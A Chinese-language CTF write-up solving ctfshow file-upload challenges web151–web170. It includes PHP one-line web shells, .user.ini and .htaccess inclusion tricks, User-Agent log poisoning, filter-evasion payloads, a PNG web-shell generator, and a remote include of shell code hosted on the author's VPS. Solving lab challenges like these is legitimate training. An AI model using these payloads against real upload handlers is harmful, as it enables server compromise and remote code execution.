## web151 前端校验

访问网站，出现如下页面：

[![image-20231101181827174](https://image.3001.net/images/20240114/1705219411_65a39553cd61b4d0ece0e.png)](https://image.3001.net/images/20240114/1705219411_65a39553cd61b4d0ece0e.png)

右键检查发现，当我们点击 button 提交的时候，会触发下框中的匿名函数，并且从该前端代码可以得知，这里只允许上传 PNG 后缀的图片。

[![image-20231101182208617](https://image.3001.net/images/20240114/1705219416_65a39558a7eff3cc635ab.png)](https://image.3001.net/images/20240114/1705219416_65a39558a7eff3cc635ab.png)

但是由于文件合法性校验发生在前端页面，故而这里我们可以进行绕过。

**方法一：直接右键检查修改源码：**

[![image-20231101182809316](https://image.3001.net/images/20240114/1705219991_65a39797f104c2f6393bf.png)](https://image.3001.net/images/20240114/1705219991_65a39797f104c2f6393bf.png)

然后上传即可。

[![image-20231101182820332](https://image.3001.net/images/20240114/1705219989_65a397958692dc6a18932.png)](https://image.3001.net/images/20240114/1705219989_65a397958692dc6a18932.png)

**方法二：使用 Burpsuite 进行抓包：**

先将 PHP 木马文件修改为以 .png 结尾的文件，接着使用 BP 抓取登陆的数据包，将文件名修改即可：

[![image-20231101183138970](https://image.3001.net/images/20240114/1705219987_65a39793299c2b688c808.png)](https://image.3001.net/images/20240114/1705219987_65a39793299c2b688c808.png)

使用中国菜刀或者蚁剑连接即可，为了方便我这里直接使用 HackerBar 进行传参利用：

[![image-20231101183735747](https://image.3001.net/images/20240114/1705219983_65a3978f8a647e2d82c8f.png)](https://image.3001.net/images/20240114/1705219983_65a3978f8a647e2d82c8f.png)

## web152 前端 + 后端 MIME 校验

界面与上一关一致，这里就不再截图。

直接上传一个 PHP 文件提示：

[![image-20231101183958909](https://image.3001.net/images/20240114/1705219980_65a3978c4562c57d98eae.png)](https://image.3001.net/images/20240114/1705219980_65a3978c4562c57d98eae.png)

查看前端源码，发现这里也进行了前端的校验：

[![image-20231101184224523](https://image.3001.net/images/20240114/1705219977_65a39789b88577a65ad32.png)](https://image.3001.net/images/20240114/1705219977_65a39789b88577a65ad32.png)

直接修改前端源码之后，进行上传发现无法成功。

于是这里使用 BP 抓取上传的数据库，接着发到重发器进行测试：

先直接上传 PHP 后缀的文件，页面返回：

[![image-20231101184604776](https://image.3001.net/images/20240114/1705219975_65a39787ae6075946ceda.png)](https://image.3001.net/images/20240114/1705219975_65a39787ae6075946ceda.png)

通过前端代码发现，这里只要是状态码不等于 0 的，则都是上传失败的数据包。

[![image-20231101184625324](https://image.3001.net/images/20240114/1705219972_65a397845ac522474db30.png)](https://image.3001.net/images/20240114/1705219972_65a397845ac522474db30.png)

经过测试发现，这里进行了 MIME 检测，通过修改请求头中的 `Content-Type` 字段，将其修改为 `image/png` 即可实现任意文件上传。

[![image-20231101184857019](https://image.3001.net/images/20240114/1705219970_65a397823c571726ccadd.png)](https://image.3001.net/images/20240114/1705219970_65a397823c571726ccadd.png)

> 本关卡进行了 前端校验 + 后端的 MIME 值校验。
>
> 绕过方法：先上传一个后缀名为 png 的文件，接着使用 BP 抓取上传的数据包，将文件后缀 png 修改为 PHP，将 Content-Type 修改为 image/png 即可。

[![image-20231101185032601](https://image.3001.net/images/20240114/1705219967_65a3977f3e3776bdf801a.png)](https://image.3001.net/images/20240114/1705219967_65a3977f3e3776bdf801a.png)

[![image-20231101185355503](https://image.3001.net/images/20240114/1705219963_65a3977bdbd8aba0c0848.png)](https://image.3001.net/images/20240114/1705219963_65a3977bdbd8aba0c0848.png)

## web153 前端 + 后端 MIME + 黑名单

同样存在前端校验，这里我们上传一个 png 结尾的一句话木马文件，接着使用 BP 抓包进行测试。

经过测试发现，这里存在 **前端校验 + 后端 MIME 校验 + 黑名单**，发现可以通过修改请求头中的 `content-type` 值为 image/png，即可上传非脚本文件。

[![image-20231101190228068](https://image.3001.net/images/20240114/1705219960_65a397789a145fc65d683.png)](https://image.3001.net/images/20240114/1705219960_65a397789a145fc65d683.png)

[![image-20231101190250111](https://image.3001.net/images/20240114/1705219958_65a3977644a2a443bab4b.png)](https://image.3001.net/images/20240114/1705219958_65a3977644a2a443bab4b.png)

但是这里直接上传 php 后缀的文件是不行的，因此存在黑名单。

[![image-20231101190345149](https://image.3001.net/images/20240114/1705219956_65a397743d837bac1f1f3.png)](https://image.3001.net/images/20240114/1705219956_65a397743d837bac1f1f3.png)

尝试替换为其他可以解析 PHP 代码的文件后缀，比如 `php3`、`php4`、`php`、`phtml`、`pht` 后缀。虽然都上传成功，但是都无法解析。访问直接下载该文件。因为其服务器使用的是 nginx 搭建，故而无法解析。

[![image-20231101190819687](https://image.3001.net/images/20240114/1705219953_65a397711b4e83ed4b564.png)](https://image.3001.net/images/20240114/1705219953_65a397711b4e83ed4b564.png)

[![image-20231101190841994](https://image.3001.net/images/20240114/1705219950_65a3976e818539c807eee.png)](https://image.3001.net/images/20240114/1705219950_65a3976e818539c807eee.png)

这里可以尝试上传`.htaccess` 文件，但是由于服务器是使用 nginx 搭建的，故而`.htaccess` 上传无效。但是可以上传`.user.ini` 文件。

`.user.ini` 文件类似于 PHP 的 `php.ini` 文件，他们都可以称为是 PHP 的配置文件。`user.ini.` 它比 `.htaccess` 用的更广，不管是 nginx/apache/IIS，只要是以 `fastcgi` 运行的 `php` 都可以用这个方法。

使用`.user.ini` 的条件：

- 服务器脚本语言为 PHP
- 对应目录下面有可执行的 php 文件，如 index.php
- 服务器使用 CGI/FastCGI 模式

这里我们先上传 `zzz.png` 文件，内容为一句话木马：

[![image-20231101191828630](https://image.3001.net/images/20240114/1705219947_65a3976ba1a3f3cda6100.png)](https://image.3001.net/images/20240114/1705219947_65a3976ba1a3f3cda6100.png)

接着我们上传 `.user.ini` 文件到服务器，文件的内容如下：

```
ini
auto_prepend_file=zzz.png
```

[![image-20231101192229052](https://image.3001.net/images/20240114/1705219944_65a397687d12b97f98f55.png)](https://image.3001.net/images/20240114/1705219944_65a397687d12b97f98f55.png)

在 upload 目录下存在 index.php 文件，我们直接访问该文件利用即可（这里可能需要多刷新几次）。

[![image-20231101192308912](https://image.3001.net/images/20240114/1705219941_65a39765496a70c8e4580.png)](https://image.3001.net/images/20240114/1705219941_65a39765496a70c8e4580.png)

**释义：**

在 PHP 的配置文件（php.ini） 中存在这么两个配置：

```
ini
; Automatically add files before PHP document.
; ；在PHP文档之前自动添加文件(类似于PHP语法中的include)
auto_prepend_file =

; Automatically add files after PHP document.
; 在PHP文档之后自动添加文件(类似于PHP语法中的include)
auto_append_file =
```

而 `.user.ini` 文件官方对他的解析：

[![image-20231101192711220](https://image.3001.net/images/20240114/1705219938_65a3976288a4ecddd1917.png)](https://image.3001.net/images/20240114/1705219938_65a3976288a4ecddd1917.png)

大概意思就是说，PHP 的 CGI/FastCGI 支持每个目录都有一个 PHP 配置文件，该配置文件就是 `.user.ini` 。

而我们上传的 `.user.ini` 内容为 `auto_prepend_file=zzz.png` 其实就是想让 zzz.png 上传之后的 upload 目录下的 index.php 文件包含 zzz.png 一句话木马文件，最终达到利用的效果。

**注意：`.user.ini` 配置文件的内容，只对当前目录有效！**

## web154 前端 + 后端 MIME + 黑名单 + 内容检查 PHP

经过测试，发现这里进行了 **前端校验 + 后端 MIME + 文件内容检查 + 黑名单**

首先，我们上传文件后缀为 `png` ；`content-type` 值为 `image/png` 的图片，内容为一句话木马，提示如下：

[![image-20231101195608930](https://image.3001.net/images/20240114/1705219934_65a3975e237d0756d62f0.png)](https://image.3001.net/images/20240114/1705219934_65a3975e237d0756d62f0.png)

由于后端返回的数据经过了 Unicode 编码，这里我们使用浏览器的控制台，使用 JS 中的 `alert()` 函数进行解码。

[![image-20231101195739086](https://image.3001.net/images/20240114/1705219931_65a3975b3867288b71094.png)](https://image.3001.net/images/20240114/1705219931_65a3975b3867288b71094.png)

发现提示文件内容不合规，应该是对文件内容做了检查，优先猜测是 文件头检测，尝试加上 GIF89a 的文件头，发现问题依旧存在。

[![image-20231101195908349](https://image.3001.net/images/20240114/1705219929_65a397595bd790eb86bc0.png)](https://image.3001.net/images/20240114/1705219929_65a397595bd790eb86bc0.png)

接着尝试制作图片马进行上传：

[![image-20231101200033851](https://image.3001.net/images/20240114/1705219924_65a3975486c74dc4a51f6.png)](https://image.3001.net/images/20240114/1705219924_65a3975486c74dc4a51f6.png)

将该图片马上传：

[![image-20231101200259878](https://image.3001.net/images/20240114/1705219921_65a397516293d89da2a02.png)](https://image.3001.net/images/20240114/1705219921_65a397516293d89da2a02.png)

发现依旧上传失败，尝试将最后木马去掉，加上一些其他字符。发现上传成功。

[![image-20231101200409601](https://image.3001.net/images/20240114/1705219907_65a39743d8c4f7f2aae02.png)](https://image.3001.net/images/20240114/1705219907_65a39743d8c4f7f2aae02.png)

尝试把 `<?php` 加上，发现上传失败：

[![image-20231101200509005](https://image.3001.net/images/20240114/1705219904_65a3974004f4002a54391.png)](https://image.3001.net/images/20240114/1705219904_65a3974004f4002a54391.png)

发现问题的所在，这里不能带有 `<?php` 字样，这里我们要说一下，如果服务器的 PHP 开启短标签或 asp 标签，我们可以不适用 `<?php` 即可解析 PHP 代码。

这里我们说以下两种方法：

在 PHP7 以下版本中，可以使用如下方法解析 PHP 代码：

```
php
<script language="php">phpinfo();</script>
```

[![image-20231101223728646](https://image.3001.net/images/20240114/1705219899_65a3973b7c5b0eb635867.png)](https://image.3001.net/images/20240114/1705219899_65a3973b7c5b0eb635867.png)

在 PHP 全版本中使用如下方法也可以解析 PHP 代码：

```
php
<?=phpinfo();?>
```

[![image-20231101223832204](https://image.3001.net/images/20240114/1705219896_65a397389d466c342d5ae.png)](https://image.3001.net/images/20240114/1705219896_65a397389d466c342d5ae.png)

通过服务器响应内容发现，这里是 PHP7 版本的，因此不能使用第一种方法，我们可以使用第二种方法绕过。

这里经过测试，发现可以上传任意后缀的文件，但是无法上传 PHP 后缀的文件，于是这里我们上一题的方法`.user.ini` 文件。

先上传后缀为 png 的一句话木马文件：

[![image-20231101224440104](https://image.3001.net/images/20240114/1705219894_65a3973661c3cee3c06cb.png)](https://image.3001.net/images/20240114/1705219894_65a3973661c3cee3c06cb.png)

其次再上传 `.user.ini` 文件：

[![image-20231101224539204](https://image.3001.net/images/20240114/1705219891_65a39733c053c930c3873.png)](https://image.3001.net/images/20240114/1705219891_65a39733c053c930c3873.png)

访问与`.user.ini` 同目录下的 index.php 文件，则自动包含图片马文件：

[![image-20231101224706801](https://image.3001.net/images/20240114/1705219890_65a397324bb5152738b35.png)](https://image.3001.net/images/20240114/1705219890_65a397324bb5152738b35.png)

## web155 前端 + 后端 MIME + 黑名单 + 内容检查 php

经过测试，本道题跟上一关方法一致，都是基于 **前端 + 后端 MIME + 黑名单 + 内容检查 PHP**

先上传 `.user.ini` 文件，文件内容如下：

```
ini
auto_prepend_file=x1ong.png
```

[![image-20231102100654913](https://image.3001.net/images/20240114/1705219887_65a3972f56a9637b5a3b4.png)](https://image.3001.net/images/20240114/1705219887_65a3972f56a9637b5a3b4.png)

其次上传 `x1ong.png` 文件，内容如下：

```
php
<?=@eval($_REQUEST["cmd"]);?>
```

[![image-20231102101028861](https://image.3001.net/images/20240114/1705219884_65a3972c6fee25a1f7e47.png)](https://image.3001.net/images/20240114/1705219884_65a3972c6fee25a1f7e47.png)

最后利用即可：

[![image-20231102101739553](https://image.3001.net/images/20240114/1705219882_65a3972a4835f343f140e.png)](https://image.3001.net/images/20240114/1705219882_65a3972a4835f343f140e.png)

其实这里也是支持短标签解析的。

## web156 前端 + 后端 MIME + 黑名单 + 内容检查 php/[]

本关和上关多过滤了 左右中括号，致使我们不能使用如下方法：

```
php
<?=eval($_REQUEST['cmd']);?>
```

但是，我们可以使用 `{}` 代替 `[]`，可以达到一样的效果。

[![image-20231102102630935](https://image.3001.net/images/20240114/1705219878_65a39726efe20d68ec034.png)](https://image.3001.net/images/20240114/1705219878_65a39726efe20d68ec034.png)

[![image-20231102102420436](https://image.3001.net/images/20240114/1705219876_65a39724b13bfe69cba8d.png)](https://image.3001.net/images/20240114/1705219876_65a39724b13bfe69cba8d.png)

这里同样上传 `.user.ini` 配置文件。

[![image-20231102102810651](https://image.3001.net/images/20240114/1705219874_65a39722e4f879e16defc.png)](https://image.3001.net/images/20240114/1705219874_65a39722e4f879e16defc.png)

## web157-158 反引号执行命令

经过测试，本关比上一关多过滤了 `{`、命令执行函数：`system`、`passthru`、`shell_exec`、`exec` 等，同时过滤了 `echo` 等关键字。

但是放出了反引号，在 PHP 中，我们也可以使用反引号达到命令执行的效果，如下：

[![image-20231102104155610](https://image.3001.net/images/20240114/1705219872_65a39720797ecd0869013.png)](https://image.3001.net/images/20240114/1705219872_65a39720797ecd0869013.png)

但是这里由于过滤了 `echo` 关键字，没有 `echo` 关键字，以上方法是行不通的。

不过在 PHP 表达式写法中，可以不使用 `echo` 关键字，即可使用反引号达到命令执行的效果，如下：

[![image-20231102104536424](https://image.3001.net/images/20240114/1705219870_65a3971ed64a11f297a93.png)](https://image.3001.net/images/20240114/1705219870_65a3971ed64a11f297a93.png)

因此，我们这里依旧上传 `.user.ini` 包含 `x1ong.png` 文件，内容如下：

```
php
<?=`tac /var/www/html/flag.*`?>
```

[![image-20231102103635313](https://image.3001.net/images/20240114/1705219852_65a3970c06f7bf0b5591e.png)](https://image.3001.net/images/20240114/1705219852_65a3970c06f7bf0b5591e.png)

[![image-20231102104708880](https://image.3001.net/images/20240114/1705219849_65a3970908ce70e291e49.png)](https://image.3001.net/images/20240114/1705219849_65a3970908ce70e291e49.png)

## web159 反引号执行命令

这里同上一样，都是先上传`.user.ini` 引入 `x1ong.png` 文件。

`x1ong.png` 文件内容如下：

```
php
<?=`cat /var/www/html/flag.*`?>
```

[![image-20231102110210300](https://image.3001.net/images/20240114/1705219845_65a39705c70f2e85b371b.png)](https://image.3001.net/images/20240114/1705219845_65a39705c70f2e85b371b.png)

[![image-20231102110340403](https://image.3001.net/images/20240114/1705219843_65a397039b337c2e1c159.png)](https://image.3001.net/images/20240114/1705219843_65a397039b337c2e1c159.png)

## web160 日志包含

经过测试，这里重点过滤了 左右括号，因此传统的手法是使用不了的，这里尝试 日志文件包含，但是发现过滤了 `log` 关键字。

[![image-20231102111347723](https://image.3001.net/images/20240114/1705219841_65a397012113b8a89bc94.png)](https://image.3001.net/images/20240114/1705219841_65a397012113b8a89bc94.png)

但是可以进行拼接绕过，最终的代码如下：

```
php
<?=include"/var/lo"."g/nginx/access.l"."og"?>
```

[![image-20231102111522254](https://image.3001.net/images/20240114/1705219837_65a396fd35540ac0f4813.png)](https://image.3001.net/images/20240114/1705219837_65a396fd35540ac0f4813.png)

访问 upload 目录下的 index.php 文件，发现成功包含日志：

[![image-20231102111813485](https://image.3001.net/images/20240114/1705219835_65a396fb4a3bf9873aaed.png)](https://image.3001.net/images/20240114/1705219835_65a396fb4a3bf9873aaed.png)

我们修改 UA 字段为一句话木马，之后利用即可：

[![image-20231102112917503](https://image.3001.net/images/20240114/1705219833_65a396f912b2562c63416.png)](https://image.3001.net/images/20240114/1705219833_65a396f912b2562c63416.png)

[![image-20231102113006577](https://image.3001.net/images/20240114/1705219830_65a396f6a79bfe32a4f97.png)](https://image.3001.net/images/20240114/1705219830_65a396f6a79bfe32a4f97.png)

## web161 日志包含文件头校验

经过测试，发现比上一关多了文件头的校验。

这里我们可以直接加上 GIF 图片的文件头 `GIF89a` 进行上传即可：

[![image-20231105144033069](https://image.3001.net/images/20240114/1705219826_65a396f2e7a3dda1c4947.png)](https://image.3001.net/images/20240114/1705219826_65a396f2e7a3dda1c4947.png)

当然这里也可以使用图片马的形式进行上传。

接着再上传一个 `.user.ini` 文件即可：

[![image-20231105144229589](https://image.3001.net/images/20240114/1705219824_65a396f04087add58718e.png)](https://image.3001.net/images/20240114/1705219824_65a396f04087add58718e.png)

内容如下：

```
bash
GIF89a
auto_prepend_file=x1ong.png
```

接着访问 upload 目录下的 index.php 文件：

[![image-20231105144331213](https://image.3001.net/images/20240114/1705219819_65a396eb5207cd3c60a63.png)](https://image.3001.net/images/20240114/1705219819_65a396eb5207cd3c60a63.png)

成功包含日志。

这里直接将 UA 字段修改为一句话木马，最后利用即可。

## web162-163 session 包含

这里由于过滤了 `.` 拼接符号，以及过滤了 `;`，无法使用包含日志的形式 getshell，故而只能使用包含 session 文件。

这里可以直接省去包含 PNG 图片，直接包含 SESSION 文件。该路径为 `/tmp/sess_x1ong`，这里需要采用竞争的形式进行利用。

但是**由于 ctfshow 平台凌晨才会开放竞争条件**，于是我们这里先使用非预期的解法：**文件包含的形式**

SESSION 包含参考：https://www.cnblogs.com/sen-y/p/15579078.html#_label10

**前置环境搭建：**

1. 首先在 VPS 上创建 app.py 文件，内容如下：

```
python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world():
    return '<?php eval($_REQUEST["cmd"]);?>'
```

1. 接着在 VPS 上启动 web 服务：

```
bash
python3 -m flask run --host=0.0.0.0 --port=80
```

[![image-20231107114307129](https://image.3001.net/images/20240114/1705219811_65a396e3ad909ca051e15.png)](https://image.3001.net/images/20240114/1705219811_65a396e3ad909ca051e15.png)

**解题：**

1. 上传 `.user.ini` 文件，内容如下：

```
plaintext
GIF89a
auto_prepend_file=x1ong
```

[![image-20231107114455245](https://image.3001.net/images/20240114/1705219587_65a396037c6fafa0fbb70.png)](https://image.3001.net/images/20240114/1705219587_65a396037c6fafa0fbb70.png)

1. 上传名为 `x1ong` 内容如下的文件：

```
php
<?=include"http://148572975"?>
```

[![image-20231107150237133](https://image.3001.net/images/20240114/1705219585_65a396011faab1f707dc2.png)](https://image.3001.net/images/20240114/1705219585_65a396011faab1f707dc2.png)

1. 利用即可

[![image-20231107150420362](https://image.3001.net/images/20240114/1705219582_65a395fe974d085816126.png)](https://image.3001.net/images/20240114/1705219582_65a395fe974d085816126.png)

> web163 与 web162 略微有点区别，web163 在上传 `x1ong` 文件的时候，会立即删除，这里我们需要进行竞争。暴破一直发送。
>
> 但是我们不使用这种方法，我们在 web163 使用 `auto_prepend_file` 直接包含远程文件。

**web163：**

[![image-20231107152709143](https://image.3001.net/images/20240114/1705219580_65a395fc2f6b77e0ffeb7.png)](https://image.3001.net/images/20240114/1705219580_65a395fc2f6b77e0ffeb7.png)

[![image-20231107153022074](https://image.3001.net/images/20240114/1705219578_65a395fa7510fd004e604.png)](https://image.3001.net/images/20240114/1705219578_65a395fa7510fd004e604.png)

## web164 PNG 二次渲染绕过

使用如下脚本生成 PNG 的图片马：

```
php

<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'1.png'); #保存在本地的图片马
?>
```

将以上代码保存为文件 `generatePng.php` ，接着运行即可得到 `1.png`， 该图片则是一个图片马。

[![image-20231105195122914](https://image.3001.net/images/20240114/1705219574_65a395f694b104d51f8a1.png)](https://image.3001.net/images/20240114/1705219574_65a395f694b104d51f8a1.png)

接着将该图片上传，点击查看图片，会跳转到如下页面：

[![image-20231105195210849](https://image.3001.net/images/20240114/1705219571_65a395f3c1dd0b42f5862.png)](https://image.3001.net/images/20240114/1705219571_65a395f3c1dd0b42f5862.png)

根据传参的形容猜测可能是文件包含，尝试直接包含我们的图片马文件进行利用。最终得到 FLAG。

[![image-20231105195540340](https://image.3001.net/images/20240114/1705219569_65a395f1f0948b26c7472.png)](https://image.3001.net/images/20240114/1705219569_65a395f1f0948b26c7472.png)

## web165 JPG 二次渲染绕过

这里我们准一张图片：

[![image-202311061010](https://image.3001.net/images/20240114/1705219557_65a395e54dc2c7dbfde0f.jpg)](https://image.3001.net/images/20240114/1705219557_65a395e54dc2c7dbfde0f.jpg)

**将该图片上传并下载下来**，接着使用如下脚本生成图片马即可。

所需脚本下载地址：https://github.com/BlackFan/jpg_payload/blob/master/jpg_payload.php

运行该脚本：

```
bash
php jpg_payload.php download.jpg
# 其中的download.jpg为上传之后下载的JPG图片。
```

[![image-20231106214325713](https://image.3001.net/images/20240114/1705219554_65a395e26d4466b07332d.png)](https://image.3001.net/images/20240114/1705219554_65a395e26d4466b07332d.png)

最后将生成的 `payload_download.jpeg` 图片修改为 `payload_download.jpg` 上传即可。

[![image-20231106214822437](https://image.3001.net/images/20240114/1705219550_65a395deeccea0d5f13b5.png)](https://image.3001.net/images/20240114/1705219550_65a395deeccea0d5f13b5.png)

## web166 压缩包包含利用

这里需要上传 zip 文件格式的压缩包。但是我这里使用电脑压缩的 zip 压缩包上传一直提示，文件类型不合规。

后来在网上看了其他师傅 WP 才知道，这里使用 `winRar` 软件打包的压缩包，是可以直接上传的。

如果使用其他压缩软件，在上传的时候，需要将原有文件的 MIME 值 `application/zip` 修改为 `application/x-zip-compressed`。

这里随便压缩一个文件，将其上传：

[![image-20231107085112115](https://image.3001.net/images/20240114/1705219547_65a395dbb534ece8e034c.png)](https://image.3001.net/images/20240114/1705219547_65a395dbb534ece8e034c.png)

当我们上传成功之后，这里提示下载该文件：

[![image-20231107085149686](https://image.3001.net/images/20240114/1705219544_65a395d8a4f3e6a688a6f.png)](https://image.3001.net/images/20240114/1705219544_65a395d8a4f3e6a688a6f.png)

点击之后跳转到如下页面：

[![image-20231107085207238](https://image.3001.net/images/20240114/1705219542_65a395d6c14bb6786def4.png)](https://image.3001.net/images/20240114/1705219542_65a395d6c14bb6786def4.png)

通过 URL 发现，猜测这里可能是文件包含，我们这里可以使用如下两种方法：

1. 准备一个一句话木马文件进行压缩，然后将压缩包上传。

[![image-20231107085501299](https://image.3001.net/images/20240114/1705219540_65a395d4983699417f3d4.png)](https://image.3001.net/images/20240114/1705219540_65a395d4983699417f3d4.png)

1. 也可以直接通过 BP 修改 Content-Type 值以及文件名后缀上传即可。

[![image-20231107085717176](https://image.3001.net/images/20240114/1705219538_65a395d23d887c4d29a1b.png)](https://image.3001.net/images/20240114/1705219538_65a395d23d887c4d29a1b.png)

这里我使用第二种方法，上传完成之后，直接可以下载文件：

[![image-20231107085843242](https://image.3001.net/images/20240114/1705219534_65a395cecd6314ff44283.png)](https://image.3001.net/images/20240114/1705219534_65a395cecd6314ff44283.png)

通过 BP 抓包下载文件时发送的请求，由于这里是使用文件包含的形式，因此可以直接利用该 ZIP 木马。

[![image-20231107085958575](https://image.3001.net/images/20240114/1705219531_65a395cb3856dbf575a37.png)](https://image.3001.net/images/20240114/1705219531_65a395cb3856dbf575a37.png)

## web167 .htaccess 文件的利用

题目提示是 `httpd`， 这让人联想到了 `.htaccess` 文件。

经过测试发现，这里**可以通过修改 `content-type` 值为图片类型，可以上传任意 非 php 后缀的文件**。

[![image-20231107090725257](https://image.3001.net/images/20240114/1705219527_65a395c736c30f4fe2b78.png)](https://image.3001.net/images/20240114/1705219527_65a395c736c30f4fe2b78.png)

但是不能上传 php 后缀的文件：

[![image-20231107090803567](https://image.3001.net/images/20240114/1705219524_65a395c42b759d57c2c18.png)](https://image.3001.net/images/20240114/1705219524_65a395c42b759d57c2c18.png)

可以上传 `.phtml` 后缀的文件，但是服务器不解析。

[![image-20231107090821729](https://image.3001.net/images/20240114/1705219521_65a395c15d3891be39cd7.png)](https://image.3001.net/images/20240114/1705219521_65a395c15d3891be39cd7.png)

由于题目提示是 `httpd` 尝试上传 `.htaccess` 文件。

文件内容如下：

```
php
<FilesMatch "x1ong.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

[![image-20231107091835153](https://image.3001.net/images/20240114/1705219516_65a395bc1378353ec7b45.png)](https://image.3001.net/images/20240114/1705219516_65a395bc1378353ec7b45.png)

接着上传名为 `x1ong.jpg` 的文件，内容为一句话木马，访问即可利用：

[![image-20231107092006412](https://image.3001.net/images/20240114/1705219513_65a395b91bf3aae640fee.png)](https://image.3001.net/images/20240114/1705219513_65a395b91bf3aae640fee.png)

[![image-20231107092037400](https://image.3001.net/images/20240114/1705219510_65a395b6a9fa28e7073d0.png)](https://image.3001.net/images/20240114/1705219510_65a395b6a9fa28e7073d0.png)

以下是 apache httpd 官方文档对 `.htaccess` 文件的解释：

[![image-20231107092229894](https://image.3001.net/images/20240114/1705219507_65a395b3df2aad322cac9.png)](https://image.3001.net/images/20240114/1705219507_65a395b3df2aad322cac9.png)

而 `FileMatch` 则表示匹配，对 `x1ong.jpg` 使用规则 `SetHandler application/x-httpd-php` 表示将该图片交给 PHP 去执行。

由于 `x1ong.jpg` 的内容为一句话木马，因此我们可以直接利用。

**通过服务器响应值发现题目中间件使用的是 nginx，正常来说，nginx 是没有.htaccess 文件的，自然也不会生效，本道题可能 Server 信息有误或者手动构建了可利用的环境。**

## web168 基础免杀

通过测试发现这里可以通过 **前端校验 + MIME 绕过** 即可上传 php 后缀的文件，并且该 php 可以自己解析。

[![image-20231107093107598](https://image.3001.net/images/20240114/1705219501_65a395adaa15a78a64884.png)](https://image.3001.net/images/20240114/1705219501_65a395adaa15a78a64884.png)

[![image-20231107093116137](https://image.3001.net/images/20240114/1705219498_65a395aa0127772757b45.png)](https://image.3001.net/images/20240114/1705219498_65a395aa0127772757b45.png)

但是我们上传一句话木马的时候，页面返回 `null`。

[![image-20231107093221688](https://image.3001.net/images/20240114/1705219494_65a395a6deb7cf80eacef.png)](https://image.3001.net/images/20240114/1705219494_65a395a6deb7cf80eacef.png)

猜测这里需要做免杀。这里发现服务器使用的是 PHP7.3 的版本，

可以使用如下方法执行命令：

```
php
('system')('ls');
```

但是这里不能使用 `system` 关键字，可以使用 `base64_decode` 函数，因此构造如下 PAYLOAD：

```
php
<?php
(base64_decode('c3lzdGVt'))('ls');
?>
```

[![image-20231107094126629](https://image.3001.net/images/20240114/1705219492_65a395a407ed87e796abf.png)](https://image.3001.net/images/20240114/1705219492_65a395a407ed87e796abf.png)

[![image-20231107094227500](https://image.3001.net/images/20240114/1705219489_65a395a1d843fbb4cdade.png)](https://image.3001.net/images/20240114/1705219489_65a395a1d843fbb4cdade.png)

FLAG 不在这里。经过查看发现 FLAG 在网站根目录下名为 `flagaa.php` 文件。

[![image-20231107094336229](https://image.3001.net/images/20240114/1705219486_65a3959e8a620c0a7ca8e.png)](https://image.3001.net/images/20240114/1705219486_65a3959e8a620c0a7ca8e.png)

## web169-170 高级免杀

经过测试发现这里是 **前端要求上传 zip 后端要求上传 JPG**， 我们这里绕过一下即可：

[![image-20231107100324042](https://image.3001.net/images/20240114/1705219483_65a3959b4312b7e7f8396.png)](https://image.3001.net/images/20240114/1705219483_65a3959b4312b7e7f8396.png)

当我们上传内容为 `<` 的时候，这里提示 `null`，没有上传成功。但是当我们上传内容为 `123` 的时候，发现可以成功上传，并且可以访问：

[![image-20231107100427094](https://image.3001.net/images/20240114/1705219480_65a39598db92e15e21f95.png)](https://image.3001.net/images/20240114/1705219480_65a39598db92e15e21f95.png)

[![image-20231107100448618](https://image.3001.net/images/20240114/1705219478_65a39596a8a7cd8837fb0.png)](https://image.3001.net/images/20240114/1705219478_65a39596a8a7cd8837fb0.png)

由于过滤了 `<`，那么就没有办法执行 PHP 代码了，只能尝试通过上传 `.user.ini` 文件包含日志或者使用伪协议。

**1. 使用伪协议无法上传，大小写无法绕过 php 关键字。**

[![image-20231107101429288](https://image.3001.net/images/20240114/1705219476_65a3959431ab54563b46f.png)](https://image.3001.net/images/20240114/1705219476_65a3959431ab54563b46f.png)

**2. 包含日志成功上传：**

[![image-20231107101404508](https://image.3001.net/images/20240114/1705219474_65a395920eae2dff799e7.png)](https://image.3001.net/images/20240114/1705219474_65a395920eae2dff799e7.png)

包含日志上传成功了， 我们访问 upload 目录，发现 upload 目录下并没有 `index.php` 或者 其他 PHP 文件，导致 `.user.ini` 无法包含。

[![image-20231107100823806](https://image.3001.net/images/20240114/1705219471_65a3958fde180e473fe3d.png)](https://image.3001.net/images/20240114/1705219471_65a3958fde180e473fe3d.png)

那么这里我们可以上传一个名为 `index.php` 或者其他文件名的文件。

[![image-20231107100901894](https://image.3001.net/images/20240114/1705219468_65a3958c3005a69f3e89f.png)](https://image.3001.net/images/20240114/1705219468_65a3958c3005a69f3e89f.png)

接着访问 `x1ong.php` 文件，即可自动包含 `/var/log/nginx/access.log` 文件。

[![image-20231107101738660](https://image.3001.net/images/20240114/1705219465_65a395897e60ad167668b.png)](https://image.3001.net/images/20240114/1705219465_65a395897e60ad167668b.png)

修改 UA 字段为一句话木马：

[![image-20231107102443819](https://image.3001.net/images/20240114/1705219462_65a39586aabcfd9cfe27b.png)](https://image.3001.net/images/20240114/1705219462_65a39586aabcfd9cfe27b.png)

最后利用即可：

[![image-20231107102646878](https://image.3001.net/images/20240114/1705219457_65a39581ad685bab8893c.png)](https://image.3001.net/images/20240114/1705219457_65a39581ad685bab8893c.png)